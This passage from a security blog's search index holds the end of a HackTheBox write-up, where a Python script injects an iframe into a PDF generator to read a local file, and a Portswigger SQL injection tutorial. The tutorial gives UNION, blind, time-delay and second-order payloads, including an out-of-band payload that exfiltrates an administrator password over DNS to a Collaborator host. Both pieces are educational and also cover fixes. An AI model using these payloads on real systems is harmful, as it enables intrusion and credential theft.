class="string">&quot;content&quot;</span>: content&#125;</span><br><span class="line">    r = session.post(<span class="string">f&quot;<span class="subst">&#123;target&#125;</span>/document/debug/export&quot;</span>, data=data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;HTB&#123;&quot;</span> <span class="keyword">in</span> r.content:</span><br><span class="line">        <span class="keyword">match</span> = re.search(<span class="string">b&quot;HTB\\&#123;[^&#125;]+\\&#125;&quot;</span>, r.content)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;FLAG: <span class="subst">&#123;<span class="keyword">match</span>.group().decode()&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&quot;output_<span class="subst">&#123;i&#125;</span>.pdf&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(r.content)</span><br></pre></td></tr></table></figure><p><strong>Working payload:</strong> <code>&lt;iframe src=&#39;/flag.txt&#39;&gt;&lt;/iframe&gt;</code> (payload index 2)</p><p>The generated PDF (<code>output_2.pdf</code>) contained the flag.</p><hr><h3 id="Step-4-Extract-the-Flag"><a href="#Step-4-Extract-the-Flag" class="headerlink" title="Step 4: Extract the Flag"></a>Step 4: Extract the Flag</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">strings output_2.pdf | grep HTB</span><br><span class="line"><span class="comment"># or</span></span><br><span class="line">pdftotext output_2.pdf - | grep HTB</span><br></pre></td></tr></table></figure><p><strong>Flag obtained:</strong> <code>HTB{...}</code></p><hr><h2 id="Why-the-Iframe-Payload-Worked"><a href="#Why-the-Iframe-Payload-Worked" class="headerlink" title="Why the Iframe Payload Worked"></a>Why the Iframe Payload Worked</h2><ol><li>The <code>markdown-pdf</code> library uses <strong>PhantomJS</strong> (headless browser) to render HTML to PDF</li><li>PhantomJS processes iframes and makes HTTP requests to the specified URLs</li><li><code>/flag.txt</code> was served by the same web server (since static files are served from the root)</li><li>The iframe fetched the file content, which was then rendered into the PDF</li></ol><p>The JavaScript payloads failed because PhantomJS likely had JavaScript restrictions or the fetch API wasn’t available. Image tags didn’t work because they expected actual image data. The iframe successfully loaded the text file as an HTML document.</p><hr><h2 id="How-to-Fix-These-Vulnerabilities"><a href="#How-to-Fix-These-Vulnerabilities" class="headerlink" title="How to Fix These Vulnerabilities"></a>How to Fix These Vulnerabilities</h2><h3 id="1-Strong-Access-Pass"><a href="#1-Strong-Access-Pass" class="headerlink" title="1. Strong Access Pass"></a>1. Strong Access Pass</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Instead of 4-digit code:</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">generateAccessCode</span> = (<span class="params"></span>) =&gt; crypto.<span class="title function_">randomBytes</span>(<span class="number">32</span>).<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line"><span class="comment">// 64-character hex string = 2^256 possibilities</span></span><br></pre></td></tr></table></figure><h3 id="2-Rate-Limiting"><a href="#2-Rate-Limiting" class="headerlink" title="2. Rate Limiting"></a>2. Rate Limiting</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> rateLimit = <span class="built_in">require</span>(<span class="string">&#x27;express-rate-limit&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> limiter = <span class="title function_">rateLimit</span>(&#123;</span><br><span class="line">  <span class="attr">windowMs</span>: <span class="number">15</span> * <span class="number">60</span> * <span class="number">1000</span>, <span class="comment">// 15 minutes</span></span><br><span class="line">  <span class="attr">max</span>: <span class="number">5</span> <span class="comment">// 5 attempts max</span></span><br><span class="line">&#125;);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/document/debug/export&#x27;</span>, limiter);</span><br></pre></td></tr></table></figure><h3 id="3-Disable-Local-File-Access-in-PDF-Generator"><a href="#3-Disable-Local-File-Access-in-PDF-Generator" class="headerlink" title="3. Disable Local File Access in PDF Generator"></a>3. Disable Local File Access in PDF Generator</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Use a safer PDF generator or configure PhantomJS to block file:// and local requests</span></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">generatePDF</span> = <span class="keyword">async</span> (<span class="params">content</span>) =&gt; &#123;</span><br><span class="line">  <span class="comment">// Sanitize content to remove iframes, object tags, etc.</span></span><br><span class="line">  <span class="keyword">const</span> sanitized = <span class="title function_">sanitizeHtml</span>(content, &#123;</span><br><span class="line">    <span class="attr">allowedTags</span>: [<span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;strong&#x27;</span>, <span class="string">&#x27;em&#x27;</span>, <span class="string">&#x27;h1&#x27;</span>, <span class="string">&#x27;h2&#x27;</span>, <span class="string">&#x27;h3&#x27;</span>, <span class="string">&#x27;ul&#x27;</span>, <span class="string">&#x27;ol&#x27;</span>, <span class="string">&#x27;li&#x27;</span>],</span><br><span class="line">    <span class="attr">allowedAttributes</span>: &#123;&#125;</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="comment">// ... rest of PDF generation</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="4-Remove-Debug-Endpoint-in-Production"><a href="#4-Remove-Debug-Endpoint-in-Production" class="headerlink" title="4. Remove Debug Endpoint in Production"></a>4. Remove Debug Endpoint in Production</h3><p>The <code>/document/debug/export</code> endpoint should never exist in production. Use environment variables to conditionally enable debug features.</p><h3 id="5-Store-Access-Pass-Securely"><a href="#5-Store-Access-Pass-Securely" class="headerlink" title="5. Store Access Pass Securely"></a>5. Store Access Pass Securely</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Don&#x27;t use filename as the secret</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">ACCESS_PASS</span> = crypto.<span class="title function_">randomBytes</span>(<span class="number">32</span>);</span><br><span class="line"><span class="comment">// Store in memory or encrypted environment variable, not as a file</span></span><br></pre></td></tr></table></figure><hr><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>This challenge combined multiple small vulnerabilities chained together:</p><ol><li><strong>Weak 4-digit access pass</strong> (brute force)</li><li><strong>Admin registration allowed</strong> (no account protection)</li><li><strong>PDF generator with HTML injection</strong> leading to local file inclusion</li></ol><p>The fix requires strong authentication, removing debug endpoints, and properly sanitizing PDF generation input.</p><p>Have a nice day, and see you again in the next writeup!<br>Any feedback in the comments section is very appreciated.</p>]]></content>
      
      
      <categories>
          
          <category> HackTheBox </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Web </tag>
            
            <tag> LFI </tag>
            
            <tag> Brute Force </tag>
            
            <tag> PDF Injection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL Injection</title>
      <link href="/2026/06/11/SQL-Injection/"/>
      <url>/2026/06/11/SQL-Injection/</url>
      
        <content type="html"><![CDATA[<blockquote><p> <strong>Difficulty</strong>: <span style="color:#9fef00">Practitioner</span></p></blockquote><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>This path includes all types of SQLi from Login Bypass, UNION Attacks, Blind Injections, Out-of-band-techniques and Second Order Injections.<br>And more importantly, demonstrations of how attacks happen &amp; how to prevent them.</p><span id="more"></span><h2 id="Origins-Of-SQLi"><a href="#Origins-Of-SQLi" class="headerlink" title="Origins Of SQLi"></a>Origins Of SQLi</h2><p>Most SQL injection vulnerabilities occur within the <code>WHERE</code> clause of a <code>SELECT</code> query, but it can also happen in <code>UPDATE</code>, <code>INSERT</code>, or <code>SELECT</code> statements.<br>The root cause of such a <span style="color:#9fef00">CRITICAL</span> vulnerability is the concatenation of parameters while building the query.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">query</span> <span class="operator">=</span> <span class="string">&quot;SELECT * FROM table_name WHERE column_name = &#x27;&quot;</span> + input + <span class="string">&quot;&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure><h2 id="Consequences-of-SQLi"><a href="#Consequences-of-SQLi" class="headerlink" title="Consequences of SQLi"></a>Consequences of SQLi</h2><p>SQL Injections can be used obviously to retrieve hidden data, getting critical personal info such as passwords, having admin access,<br>and even getting the version of the web server that is hosting the database or the entire web app. </p><h2 id="Exploitation-Techniques"><a href="#Exploitation-Techniques" class="headerlink" title="Exploitation Techniques"></a>Exploitation Techniques</h2><h3 id="Picking-targets"><a href="#Picking-targets" class="headerlink" title="Picking targets"></a>Picking targets</h3><p>While clicking on buttons and changing from windows you’ll notice some parameters get added to the base or original URL.</p><p><em>Example:</em> <code>https://blablabla.com/products?category=toys</code></p><p>Those parameters are your targets to attack because the <code>WHERE</code> statements are located in there.</p><h3 id="Injecting-comments"><a href="#Injecting-comments" class="headerlink" title="Injecting comments"></a>Injecting comments</h3><p>Going back to our example <code>https://blablabla.com/products?category=toys</code><br>This will cause the application to make this SQL query:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> products <span class="keyword">WHERE</span> category <span class="operator">=</span> <span class="string">&#x27;toys&#x27;</span> <span class="keyword">AND</span> available <span class="operator">=</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>Now when we send this exact payload to the URL <code>&#39;--</code> to make it <code>https://blablabla.com/products?category=toys&#39;--</code><br>This will result in a new query:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> products <span class="keyword">WHERE</span> category <span class="operator">=</span> <span class="string">&#x27;Gifts&#x27;</span><span class="comment">--&#x27; AND released = 1</span></span><br></pre></td></tr></table></figure><p><code>--</code> is a comment indicator in SQL, thus the new forged query will be <code>SELECT * FROM products WHERE category = &#39;Gifts&#39;</code>, which will make us able to see all products.</p><p>Another similar attack is injecting the famous <code>OR 1=1</code> payload alongside the comments to make the url <code>https://blablabla.com/products?category=toys&#39;+OR+1=1--</code><br>and the query to:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> products <span class="keyword">WHERE</span> category <span class="operator">=</span> <span class="string">&#x27;toys&#x27;</span> <span class="keyword">OR</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">--&#x27; AND released = 1</span></span><br></pre></td></tr></table></figure><p>As <code>1=1</code> is always true, we will get all products.</p><h3 id="UNION-Attacks"><a href="#UNION-Attacks" class="headerlink" title="UNION Attacks"></a>UNION Attacks</h3><p>Now assume we know that there is a table named users that has columns named username and password,<br>and back to our usual example <code>https://blablabla.com/products?category=toys</code><br>the payload now is gonna be <code>&#39; UNION SELECT username,password FROM users--</code></p><p>which will result in this query:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> name, description <span class="keyword">FROM</span> products <span class="keyword">WHERE</span> category <span class="operator">=</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> username,password <span class="keyword">FROM</span> users<span class="comment">--&#x27;</span></span><br></pre></td></tr></table></figure><div class="note warning flat"><p><strong>ALWAYS MAKE SURE THAT THE COLUMN NUMBERS OF THE ORIGINAL QUERY IS THE SAME AS THE NUMBER OF THE UNION ONE</strong></p></div><p>One trick to determine the number of columns is to keep appending <code>NULL</code> to the <code>UNION</code> query until the server returns a valid response.<br>When that happens, the number of <code>NULL</code>s is the number of the columns.<br><code>&#39; UNION SELECT NULL,NULL,NULL--</code></p><p>After determining the number of columns, try to change one <code>NULL</code> to <code>&#39;a&#39;</code> for example to check if that column type is a varchar: <code>&#39; UNION SELECT &#39;a&#39;,NULL,NULL--</code><br>Again, a positive answer is when the server returns a 200 HTTP response code.</p><p>With the UNION attack we can also examine the DB to get some useful info like:</p><ul><li>DB Version: <code>&#39; UNION SELECT @@version--</code></li><li>Listing tables in the database: <code>SELECT * FROM information_schema.tables</code></li><li>Listing columns from tables: <code>SELECT * FROM information_schema.columns WHERE table_name = &#39;Users&#39;</code></li></ul><h3 id="Blind-SQLi"><a href="#Blind-SQLi" class="headerlink" title="Blind SQLi"></a>Blind SQLi</h3><p>Blind SQLi means that we don’t see the result of our injection in the web page; we only see some specific and minor changes that we need to keep an eye for.<br>For example, if the vulnerable target is the cookie and not a url parameter, then for this type of injection using <strong>Burp Suite</strong> is more practical and easier.</p><p>Here we can try boolean based operators:<br><code>cookie = &#39;....xyz&#39; AND &#39;1&#39;=&#39;1</code>  &#x2F;  <code>cookie = &#39;....xyz&#39; AND &#39;1&#39;=&#39;2</code></p><p>Then we keep thinking in a boolean way and try payloads such as:<br><code>....xyz&#39; AND SUBSTRING((SELECT Password FROM Users WHERE Username = &#39;Administrator&#39;), 1, 1) &gt; &#39;m</code><br>to try to brute force the password.</p><h4 id="Error-Based-SQLi"><a href="#Error-Based-SQLi" class="headerlink" title="Error Based SQLi"></a>Error Based SQLi</h4><p>We opt for this type of injection when the database returns clarifying errors that help in understanding its structure and contents.</p><p>For example, again while trying to inject the cookies:</p><ul><li><code>xyz&#39; AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE &#39;a&#39; END)=&#39;a</code> the <code>CASE</code> expression evaluates to <code>&#39;a&#39;</code>, which does not cause any error.</li><li><code>xyz&#39; AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE &#39;a&#39; END)=&#39;a</code> it evaluates to <code>1/0</code>, which causes a divide-by-zero error.</li></ul><p>Using this technique, we can also retrieve data by testing one character at a time:<br><code>xyz&#39; AND (SELECT CASE WHEN (Username = &#39;Administrator&#39; AND SUBSTRING(Password, 1, 1) &gt; &#39;m&#39;) THEN 1/0 ELSE &#39;a&#39; END FROM Users)=&#39;a</code></p><h4 id="Triggering-Time-Delays"><a href="#Triggering-Time-Delays" class="headerlink" title="Triggering Time Delays"></a>Triggering Time Delays</h4><p>If the application catches database errors when the SQL query is executed and handles them gracefully, there won’t be any difference in the application’s response.<br>In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering time delays depending on whether an injected condition is true or false.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;; IF (1=2) WAITFOR DELAY &#x27;</span><span class="number">0</span>:<span class="number">0</span>:<span class="number">10</span><span class="string">&#x27;--           </span></span><br><span class="line"><span class="string">&#x27;</span>; IF (<span class="number">1</span><span class="operator">=</span><span class="number">1</span>) WAITFOR DELAY <span class="string">&#x27;0:0:10&#x27;</span><span class="comment">--</span></span><br></pre></td></tr></table></figure><p>Using this technique, we can retrieve data by testing one character at a time:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;; IF (SELECT COUNT(Username) FROM Users WHERE Username = &#x27;</span>Administrator<span class="string">&#x27; AND SUBSTRING(Password, 1, 1) &gt; &#x27;</span>m<span class="string">&#x27;) = 1 WAITFOR DELAY &#x27;</span><span class="number">0</span>:<span class="number">0</span>:&#123;delay&#125;<span class="string">&#x27;--</span></span><br></pre></td></tr></table></figure><h4 id="Out-of-band-technique-OAST"><a href="#Out-of-band-technique-OAST" class="headerlink" title="Out-of-band technique (OAST)"></a>Out-of-band technique (OAST)</h4><p>Some applications are configured to process the queries asynchronously, which will lead us to exploit this vulnerability by triggering<br>network interactions to a system that we control.<br>The most effective network protocol to use in this attack is DNS as many production networks allow free egress of DNS queries, because they’re essential for the normal operation of production systems.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;; exec master..xp_dirtree &#x27;</span><span class="operator">/</span><span class="operator">/</span><span class="number">0</span>efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net<span class="operator">/</span>a<span class="string">&#x27;--</span></span><br></pre></td></tr></table></figure><p>This causes the Database to perform a lookup for this domain: <code>0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net</code></p><p>And after confirming the possibility of an exploit we can craft malicious payloads like this one: </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username=&#x27;</span>Administrator<span class="string">&#x27;);exec(&#x27;</span>master..xp_dirtree &quot;//&#x27;+@p+&#x27;.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a&quot;<span class="string">&#x27;)--</span></span><br></pre></td></tr></table></figure><p>This input reads the password for the <code>Administrator</code> user, appends a unique Collaborator subdomain, and triggers a DNS lookup. This lookup allows you to view the captured password.</p><h2 id="Second-Order-SQLi"><a href="#Second-Order-SQLi" class="headerlink" title="Second Order SQLi"></a>Second Order SQLi</h2><p>Second-order SQL injection occurs when the application takes user input from an HTTP request and stores it for future use. This is usually done by placing the input into a database, but no vulnerability occurs at the point where the data is stored. Later, when handling a different HTTP request, the application retrieves the stored data and incorporates it into a SQL query in an unsafe way. For this reason, second-order SQL injection is also known as stored SQL injection.</p><p>For example in a sign up page, in the username field you write:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">InnocentMan<span class="string">&#x27;;UPDATE users SET password=&#x27;</span>password<span class="string">&#x27; WHERE user=&#x27;</span>administrator<span class="string">&#x27;--</span></span><br></pre></td></tr></table></figure><p>Then when logging in we can login as admin with <code>administrator</code> as username and <code>password</code> as password.</p><h2 id="How-To-Prevent-SQLi"><a href="#How-To-Prevent-SQLi" class="headerlink" title="How To Prevent SQLi"></a>How To Prevent SQLi</h2><p>You can prevent most instances of SQL injection using parameterized queries instead of string concatenation within the query. These parameterized queries are also known as “prepared statements”.</p><p>The following code is vulnerable to SQL injection because the user input is concatenated directly into the query:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">query</span> <span class="operator">=</span> <span class="string">&quot;SELECT * FROM products WHERE category = &#x27;&quot;</span>+ input + <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="type">Statement</span> <span class="variable">statement</span> <span class="operator">=</span> connection.createStatement();</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> statement.executeQuery(query);</span><br></pre></td></tr></table></figure><p>You can rewrite this code in a way that prevents the user input from interfering with the query structure:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">PreparedStatement</span> <span class="variable">statement</span> <span class="operator">=</span> connection.prepareStatement(<span class="string">&quot;SELECT * FROM products WHERE category = ?&quot;</span>);</span><br><span class="line">statement.setString(<span class="number">1</span>, input);</span><br><span class="line"><span class="type">ResultSet</span> <span class="variable">resultSet</span> <span class="operator">=</span> statement.executeQuery();</span><br></pre></td></tr></table></figure><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>As we saw in this article there are many types of SQLi and their prevention is very simple and effective.<br>Remember to always sanitize all input fields and all url params and even make some tests on the app you are building.<br>Don’t forget to check for some syntax change depending on the database type you are dealing with.</p><div class="note info flat"><p>And I highly recommend scripting the lab solvings in python to learn new things and develop the mindset for creating your own tools.<br>As a reference here is my repo where I pushed my scripts: <a href="https://github.com/0xkoat/portswigger_scripts/tree/main/SQLI">SQLi Scripts Repo</a></p></div><p>Have a nice day, and see you again in the next Article!<br>Any feedback in the comments section is very appreciated.<br>Thank you for your attention.</p>]]></content>
      
      
      <categories>
          
          <category> Portswigger </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Portswigger </tag>
            
            <tag> Web Security </tag>
            
            <tag> SQLi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Welcome to Reverse Koat Shell</title>
      <link href="/2026/06/06/welcome/"/>
      <url>/2026/06/06/welcome/</url>
      
        <content type="html"><![CDATA[<h1 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello, World!"></a>Hello, World!</h1><p>Welcome to <strong>Reverse Koat Shell</strong>. </p><p>Stay tuned for real HackTheBox writeups, CTF challenges, and security research coming soon.</p><blockquote><p><em>“The quieter you become, the more you are able to hear.”</em></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Other </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Welcome </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
